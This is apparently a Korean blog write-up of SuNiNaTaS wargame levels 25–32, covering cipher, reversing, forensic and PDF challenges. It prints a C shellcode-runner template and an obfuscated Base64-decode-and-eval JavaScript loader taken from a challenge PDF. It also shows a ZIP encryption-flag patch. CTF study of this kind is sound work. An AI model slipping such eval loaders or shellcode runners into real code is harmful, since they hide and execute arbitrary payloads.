              (new AlertDialog.Builder((Context)Suninatas25.this)).setMessage("Wrong!").setNeutralButton("Close", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface param2DialogInterface, int param2Int) {
                      param2DialogInterface.dismiss();
                    }
                  }).show();
              return;
            } 
          }
        });
  }
```

`id`, `pw` 맞추고 `Name`에는 "SuNiNaTaS", `Number`에는 문제 페이지에서 생성한 4자리 숫자를 기입하면 된다  

참고로 `pw`에 느낌표나 골뱅이 같은 특수 문자가 있으면 오류 나니까 비밀번호를 변경 후 다시 시도해야 한다  
24번과 마찬가지로 모바일 환경인 척 해야 PC에서도 AuthKey를 얻을 수 있다  
<br>

---

## Level 26

```
szqkagczvcvyabpsyincgozdainvscbnivpnzvbpnyfkqhzmmpcqhzygzgfcxznvvzgdfnvbpnjyifxmpcqhzygbpnoyaimygbzgngbvmpcqhzygcbpinnbzqndicgxhiztozgcfmpcqhzygbpnjyifxeagzyimpcqhzygbpneagzyidicgxhiztozgcfmpcqhzygcgxcoyaibzqnvyabpsyincggcbzygcfmpcqhzygszqzvbpnozivbvyabpsyincgozdainvscbnibyjzgcqnxcfcbcgzvaeagzyiyivngzyidicgxhiztnungbzvampcqhzygvpzhcgxbpnyfkqhzmdcqnvvpnzvbpnozivbonqcfnvscbnibyjzgbpnyfkqhzmdcqnvbpnjyifxmpcqhzygvpzhvbpnoyaimygbzgngbvmpcqhzygvpzhvcgxbpndicgxhiztozgcfvpnzvygnyobpnqyvbpzdpfkinmydgzlnxcbpfnbnvcgxqnxzcozdainvzgvyabpsyinccvyochizfbpzvkncivpnzvicgsnxvnmygxzgbpnjyifxrkbpnzgbnigcbzygcfvscbzgdagzygvpnzvbpnmaiingbinmyixpyfxnioyifcxznvzgbpnvpyibhiydicqbpnoinnvscbzgdcgxbpnmyqrzgnxbybcfagxnibpnzvaeaxdzgdvkvbnqvpnzvcfvybpnozivbonqcfnvscbnibyvaihcvvbpnbjypaxincxhyzgbqcisagxnibpnzvaeaxdzgdvkvbnqvpnpcvgnunirnnghfcmnxyoobpnhyxzaqzgpningbzinmcinni
```

Frequency Analysis를 사용하여 풀어야 한다  
<br>

---

![Image](/assets/img/250728_0/26_auto.png)

[이 사이트](https://www.dcode.fr/frequency-analysis)에서 자동으로 Frequency Analysis를 하여 어느 정도 디코딩해준다  

많이 어색하기에 어색한 부분은 수동으로 변경해주어야 한다  
예를 들어 SOUTH, FIGURE, SHE, IS, CHAMPION 이런 단어들은 제대로 된 단어처럼 보이기에 해당 알파벳들은 고정하고 나머지를 수정하는 식으로 가야 한다  
<br>

---

![Image](/assets/img/250728_0/26_answer.png)

손으로 직접 맞추면 이런 문자열이 나오게 된다  
띄어쓰기 및 구두점 표기가 생략되어 있기 때문에 직접 해준 후 검색해보니까 옛날 위키피디아에 적혀있던 텍스트인 것 같다  

6번과 마찬가지로 위키피디아 제목인 "kimyuna"를 입력하면 풀린다  
<br>

---

## Level 27

경희대 교수님이 출제하신 걸까..  
레전드 문제다ㄷㄷ  
<br>

---

```
Pruss is my name. I am a member of russian mafia group. we communacate via a secure channel with secure password like.. $A$"4kruss password has to be long and it should contain alphabet, number, etc. I added 'russ' at the end because my name is Pruss. and this is our password convention. we must add 'russ' to end.. because it is our code name and we are very bad russian. we use secure communication since FBI monitors our communications on the Internet. we can't use password like DDDDDHHHHHHPDDDDDruss. because these passwords can be easily broken by FBI hackers. even if the password is long enough,(something like @@@@@@@@@@@@@@@@@@@@russ) it is not secure because there is only one repeated character '@'. anyway, using secure password is important... Pruss is actually not only my name, it is also code name of our mafia. we use similar names. one of my friend's name is Druss. Druss is my best friend and a professional killer. but he is not good at security. one day Druss used a password DDDDruss I told him this is very bad and weak password. the FBI will break it very easily. so he changed his password into HHHHHHHHHHHHHHHHHHHHHHHHHHruss. I told him even if password is long, it is weak if there is no combination with number and symbol... he said 'ok Pruss, this time I'll make a very long and secure password which contains number and symbol as well!' and he made '11111DDDDD@@@@@@@@@@PDDDDD@@@@@@@@@@PDDDDDHHHHHHHHHHHHHHHHHHHHruss'!! and asked me if this is secure enough. I told him it is secure, but it is long to remember. he said 'thank you Pruss you always teach me computer security' anyway this was small talk and I will tell you something about mafia life. Druss likes to listen to music, such as rock, pop and jazz... even though he is a tough killer he has sensitive heart.. Druss likes to dressed up with very black jacket with black jean, he thinks it is a cool fashion, but I don't like it.. Druss has high IQ, he is a member of group called MENSA(group of people who has IQ over 150) so, he is very very smart. Druss has a girl friend, her name is Hruss. Hruss is also my friend too. she is very very pretty, and also a killer(!). Druss likes Hruss a lot, they are in love with each other. it is common case that mafia members hooks up together. mafia@russia.ru is our server. we have lot of data regarding our crimes in our server so FBI hackers are trying to hack mafia@russia.ru but we don't have to worry since we are using secure password(we discussed this) as I told earlier. anyway.. Pruss sounds somewhat like 'Press' so, Press is my nick name it is somewhat juvenile but I think it is pretty funny too Druss always makes fun of me by using my nick name 'Press' sometimes I got angry but I don't express my feeling because Druss is a professional killer I don't want to get shot. it is possible to get shot by mafia friends. it happened once. Druss shot a friend many years ago, he was also a mafia member. they had a quarrel and it turned into very big fight so Druss shot other friend... after that incident, I always say something nicely to him. in fact the secure password which Druss have created earlier I felt it was very stupid password. however I told him very nicely. who makes password like '@@PDDDDDPDDDDDHPDDDDD@@@@@PDDDDDPDDDDD@@@PDDDDDruss'? no body will ever think that this is a password. to me, a secure password will be say something like... kNz3i!Bs4jP
```

<details markdown="1">

<summary>줄바꿈</summary>

```
Pruss is my name. 
I am a member of russian mafia group. 
we communacate via a secure channel with secure password like.. 

$A$"4kruss password has to be long and it should contain alphabet, number, etc. 
I added 'russ' at the end because my name is Pruss. and this is our password convention. 
we must add 'russ' to end.. because it is our code name and we are very bad russian. 

we use secure communication since FBI monitors our communications on the Internet. 
we can't use password like DDDDDHHHHHHPDDDDDruss. 
because these passwords can be easily broken by FBI hackers. 
even if the password is long enough,(something like @@@@@@@@@@@@@@@@@@@@russ) it is not secure because there is only one repeated character '@'. 
anyway, using secure password is important... 

Pruss is actually not only my name, it is also code name of our mafia. 
we use similar names. 
one of my friend's name is Druss. 
Druss is my best friend and a professional killer. 
but he is not good at security. 
one day Druss used a password DDDDruss I told him this is very bad and weak password. 
the FBI will break it very easily. 
so he changed his password into HHHHHHHHHHHHHHHHHHHHHHHHHHruss. 
I told him even if password is long, it is weak if there is no combination with number and symbol... 
he said 'ok Pruss, this time I'll make a very long and secure password which contains number and symbol as well!' 
and he made '11111DDDDD@@@@@@@@@@PDDDDD@@@@@@@@@@PDDDDDHHHHHHHHHHHHHHHHHHHHruss'!! and asked me if this is secure enough. 
I told him it is secure, but it is long to remember. 
he said 'thank you Pruss you always teach me computer security' anyway this was small talk and I will tell you something about mafia life. 

Druss likes to listen to music, such as rock, pop and jazz... even though he is a tough killer he has sensitive heart.. 
Druss likes to dressed up with very black jacket with black jean, he thinks it is a cool fashion, but I don't like it.. 
Druss has high IQ, he is a member of group called MENSA(group of people who has IQ over 150) so, he is very very smart. 
Druss has a girl friend, her name is Hruss. Hruss is also my friend too. 
she is very very pretty, and also a killer(!). 
Druss likes Hruss a lot, they are in love with each other. 
it is common case that mafia members hooks up together. 
mafia@russia.ru is our server. 
we have lot of data regarding our crimes in our server so FBI hackers are trying to hack mafia@russia.ru but we don't have to worry since we are using secure password(we discussed this) as I told earlier. 
anyway.. Pruss sounds somewhat like 'Press' so, 
Press is my nick name it is somewhat juvenile but I think it is pretty funny too Druss always makes fun of me by using my nick name 'Press' sometimes I got angry but I don't express my feeling because Druss is a professional killer I don't want to get shot. 
it is possible to get shot by mafia friends. it happened once. 
Druss shot a friend many years ago, he was also a mafia member. 
they had a quarrel and it turned into very big fight so Druss shot other friend... 
after that incident, I always say something nicely to him. 
in fact the secure password which Druss have created earlier I felt it was very stupid password. 
however I told him very nicely. who makes password like '@@PDDDDDPDDDDDHPDDDDD@@@@@PDDDDDPDDDDD@@@PDDDDDruss'? 
no body will ever think that this is a password. to me, a secure password will be say something like... kNz3i!Bs4jP
```
</details>

그냥 문자열들 쭉 있다  

문제 제목이 "Can you speak x86"이다  
문자열을 헥스값으로 변환을 하면 x86 기계어로 해석할 수 있다  
근데 너무 길어서 일일히 해석하는 건 무리다  
<br>

---

```c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
"\x90\x90\x90..... (헥스 바이트 나열)" 

int main() {
    void (*func)();
    func = (void(*)())shellcode;
    func();
    return 0;
}
```

쉘코드처럼 활용하여 집어넣고 디버거로 어떻게 동작하는지 확인할 수 있다  
처음엔 이렇게 쉘코드처럼 실행해서 브포 걸어가면서 확인해보려 했지만 자꾸 Segmentation Fault가 나서 다른 방법을 찾았다  
아무래도 레지스터에 여러 번 접근하기도 하고 난독화를 위해 무의미한 명령어도 있기 때문인 것 같다  
<br>

---

![Image](/assets/img/250728_0/27_binary_copy.png)

보니까 x32dbg에 바이너리 붙여넣기 기능이 존재했다..  
아무 exe 실행 파일 열고 엔트리 포인트에 붙여넣고 실행하면 된다고 한다  

이때 스택을 조작하기 때문에 ESP를 덤프에서 따라가야 한다  
<br>

---

![Image](/assets/img/250728_0/27_break.png)

마지막에 브포 걸고 실행하면 스택 근처에 `key_is_` 문자열로 AuthKey가 찍혀있는 것을 확인할 수 있다  

어렵다.. ㅠㅠ  
x32dbg 바이너리 붙여넣기 기능을 모르면 쉽지 않은 것 같다  
<br>

---

## Level 28

암호 걸린 zip 파일만 주어진 걸 보니 그냥 국밥 문제다  
<br>

---

![Image](/assets/img/250728_0/28_zip.png)

세 개의 파일 모두 암호가 걸려있다  
<br>

---

![Image](/assets/img/250728_0/28_hex.png)

암호화 방식 플래그를 09 08에서 08 08로 고쳐준다  

자세한 내용은 [여기](https://ukkiyeon.tistory.com/38)서..  
<br>

---

![Image](/assets/img/250728_0/28_txt.png)

압축 파일 안에 있는 텍스트 파일에 키가 적혀있다  
근데 그냥 AuthKey로 넣으면 안 되고 Base64로 디코딩 후 넣어야 한다  
<br>

---

## Level 29

가상머신 이미지 파일이 주어진다  

참고로 문제 파일을 받고 헥스를 뜯어보면 파일 시그니처로 egg 압축 파일인 것을 확인할 수 있다  
`.egg` 확장자 붙이고 압축 해제하여 가상머신 파일들을 얻을 수 있다  

직접 가상머신 돌려서 확인할 수도 있지만 본인은 FTK Imager로 분석했다  

<details markdown="1">

<summary>VM으로 푸는 경우</summary>

30초마다 재부팅되도록 설정이 되어 있기 때문에 부팅하자마자 cmd 명령어를 사용하여 재부팅 설정을 끄고 분석을 진행해야 한다  
</details>
<br>

---

![Image](/assets/img/250728_0/29_hosts.png)

`C:\Windows\System32\drivers\etc\hosts`{: .filepath}  

ip주소와 도메인을 매핑해주는 리스트다  
<br>

---

![Image](/assets/img/250728_0/29_path.png)

`C:\v196vv8\v1tvr0.exe`{: filepath}  

키로거가 두 개 설치되어 있는데 다른 하나는 실행한 기록이 없다  
<br>

---

![Image](/assets/img/250728_0/29_time.jpg)

`C:\v196vv8\v1valv\Computer1\24052016 #training\ss\`{: filepath}에 단위 시간마다 찍힌 스크린샷들이 저장되어 있다  
그 중 389번 이미지에서 키로거가 설치된 시간을 알 수 있다  
<br>

---

![Image](/assets/img/250728_0/29_key.png)

`C:\v196vv8\v1valv\Computer1\24052016 #training\z1.dat`{: filepath}  
<br>

---

## Level 30

![Image](/assets/img/250728_0/30_ip.png)

---

![Image](/assets/img/250728_0/30_file.png)

---

![Image](/assets/img/250728_0/30_content.png)

RedLine 도구를 사용하여 분석할 수 있다  
<br>

---

## Level 31

pdf 파일이 하나 주어진다  
<br>

---

![Image](/assets/img/250728_0/31_pdf.png)

[PDFCrowd](https://pdfcrowd.com/inspect-pdf/) 온라인 툴에서 분석 돌렸다  
자바스크립트로 보이는 오브젝트가 삽입되어 있는 것을 확인할 수 있다  
<br>

---

```javascript
var Base64 = {
	_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
	decode : function (input) {
		for (var ah = 0; ah < (input.length); ah++){
			input=input.replace("'+'", "");
		}
		var rlLwarzv = "";
		var chr1, chr2, chr3;
		var enc1, enc2, enc3, enc4;
		var i = 0;
		input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
		while (i < input.length) {
			enc1 = this._keyStr.indexOf(input.charAt(i++));
			enc2 = this._keyStr.indexOf(input.charAt(i++));
			enc3 = this._keyStr.indexOf(input.charAt(i++));
			enc4 = this._keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 << 2) | (enc2 >> 4);
			chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
			chr3 = ((enc3 & 3) << 6) | enc4;
			rlLwarzv = rlLwarzv + String.fromCharCode(chr1);
			if (enc3 != 64) {
				rlLwarzv = rlLwarzv + String.fromCharCode(chr2);
			}
			if (enc4 != 64) {
				rlLwarzv = rlLwarzv + String.fromCharCode(chr3);
			}
		}
		eval(rlLwarzv);
	}
}
Base64.decode("'Vm0'+'wd2Qy'+'UXlW'+'a1pP'+'VldS'+'WFYw'+'ZG9WV'+'ll3W'+'kc5V'+'01Wb'+'DNXa2'+'M1VjF'+'Kc2JET'+'lhhMU'+'pUV'+'mpGS'+'2RHVk'+'dX'+'bFpOY'+'WtFe'+'FZtc'+'EdZV'+'1JIV'+'mtsa'+'QpSb'+'VJPW'+'W14R'+'00x'+'WnR'+'NWH'+'BsU'+'m1S'+'SVZ'+'tdF'+'dVZ'+'3Bp'+'Umx'+'wd1'+'ZXM'+'TRkM'+'VZX'+'WkZ'+'kYV'+'JGS'+'lVU'+'V3N'+'4Tk'+'ZaS'+'E5V'+'OVhR'+'WEJ'+'wVW'+'01Q'+'1dW'+'ZHNa'+'RFJa'+'ClYx'+'WlhWM'+'jVLVm1'+'FeVVtR'+'ldh'+'a1p'+'MVj'+'BaV'+'2RF'+'NVZ'+'PV2'+'hSV'+'0VK'+'VVd'+'XeG'+'FTM'+'VpX'+'V2t'+'kVm'+'EwN'+'VVD'+'azF'+'XV2'+'xoV'+'01X'+'aHZ'+'WMG'+'RLU'+'jJO'+'SVR'+'sWm'+'kKV'+'0do'+'NlZ'+'HeG'+'FZV'+'k5I'+'VWt'+'oU2'+'JXa'+'FdW'+'MFZ'+'LVl'+'ZkW'+'E1U'+'QlR'+'NV1'+'JYV'+'jI1'+'U2Fs'+'SllV'+'bkJEY'+'XpGV1'+'kwWm'+'9XR0'+'V4Y'+'0hK'+'V01'+'uTjN'+'aVmR'+'HUjJ'+'GRwp'+'WbGN'+'LWW'+'toQm'+'VsZH'+'NaR'+'FJa'+'Vms1'+'R1R'+'sWm'+'tZV'+'kp1U'+'WxkV'+'01GW'+'kxWb'+'FprV'+'0Ux'+'VVF'+'sUk'+'5WbH'+'BJVm'+'pKMG'+'ExZH'+'RWbk'+'pYYm'+'tKRV'+'lYcE'+'dWMW'+'t3Cl'+'dtOV'+'hSMF'+'Y1WV'+'VWN'+'FYw'+'MUh'+'Va3'+'hXT'+'VZw'+'WFl'+'6Rm'+'Fjd3'+'BqUj'+'J0T'+'FZXM'+'DFRM'+'kl4W'+'khOY'+'VJGS'+'mFWa'+'kZLU'+'1ZadG'+'RHOV'+'ZSbH'+'AxV'+'Vd4'+'a1Y'+'wMU'+'cKV'+'2t4'+'V2J'+'GcH'+'JWMG'+'RTU'+'jFw'+'SGR'+'FNV'+'diS'+'EJK'+'Vmp'+'KMF'+'lXS'+'XlS'+'WGh'+'UV0'+'dSW'+'Vlt'+'dGF'+'SVm'+'xzV'+'m5k'+'WFJ'+'sbD'+'VDb'+'VJI'+'T1Z'+'oU0'+'1GW'+'TFX'+'VlZ'+'hVT'+'FZeA'+'pTWH'+'BoU0'+'VwV1'+'lsaE'+'5lRl'+'pxUm'+'xkam'+'QzQn'+'FVak'+'owVE'+'ZaWE'+'1UUm'+'tNa'+'2w0'+'VjJ'+'4a1'+'ZtR'+'XlV'+'bGh'+'VVm'+'xae'+'lRr'+'WmF'+'kR1'+'ZJV'+'Gxw'+'V2E'+'zQj'+'VWa'+'ko0'+'CmE'+'xWX'+'lTb'+'lVL'+'VVc'+'1V1'+'ZXS'+'kZW'+'VFZ'+'WUm'+'tVN'+'VVG'+'RTl'+'QUT'+'09'");
```

![Image](/assets/img/250728_0/31_base64.png)

콘솔에 넣고 붙여주면 되는데 `eval()`을 그대로 사용하면 동작하지 않는다..  
`eval()` 대신 `document.write()`로 페이지에 직접 값을 띄우면 된다  
<br>

---

![Image](/assets/img/250728_0/31_fake.png)

근데 이걸 Base64로 10번 디코딩해보면 사실은 키가 아니라고 한다;;  
<br>

---

![Image](/assets/img/250728_0/31_pdf2.png)

다른 오프젝트가 있나 더 살펴보면 pdf 파일이 하나 더 삽입되어 있다  
<br>

---

![Image](/assets/img/250728_0/31_encrypt.png)

똑같이 온라인 툴에 넣어봤는데 Encrypted: yes 인 것을 보니 암호화가 되어 있는 것 같다..  
<br>

---

![Image](/assets/img/250728_0/31_key.png)

암호화 해제하는 온라인 툴도 굉장히 많이 있어서 암호화 해제 후 다시 돌려보면 키를 확인할 수 있다  
암호화 푸는게 이렇게 쉬우면 암호화의 의미는 뭘까..  
<br>

---

## Level 32

드디어 마지막 문제..  
귀찮아서 중간에 걍 그만 쓸까 생각도 많이 했지만 꾸역꾸역 하다 보니 끝까지 왔다  
<br>

---

FTK Imager로 풀었는데 사실 너무 쉬운 문제다..  

`\`{: .filepath} 홈 디렉토리에 `2차 테러 계획.hwp`{: .filepath} 파일이 있다  
해당 파일을 뽑아서 내용을 분석할 수 있다  

해당 파일 Extract 후에 열람하면 2차 테러 일자, 시간, 장소를 확인할 수 있다  

<br>

---

![Image](/assets/img/250728_0/32_hwp.png)

파일 수정 날짜를 확인할 수 있는데 FTK Imager를 사용할 때에 주의할 점은 UTC+9 시차를 고려해서 9시간을 더해주어야 한다  
때문에 파일 수정 일시는 2016-05-30_11:44:02인 것이다  
<br>

---

---

![Image](/assets/img/250728_0/rank.png)

비록 그리 많지 않은 32문제에 대부분 고전 문제들이지만 무언가 끝까지 해봤다는 것에 의의를 둔다  
그래도 내 실력이 고전이기 때문에 많이 알게 되었고 배웠다  

올솔하면 [인증서](https://blog.kogandhi.kr/assets/img/others/SuNiNaTaS_Certificate(kogandhi).jpg)도 준다 히히  

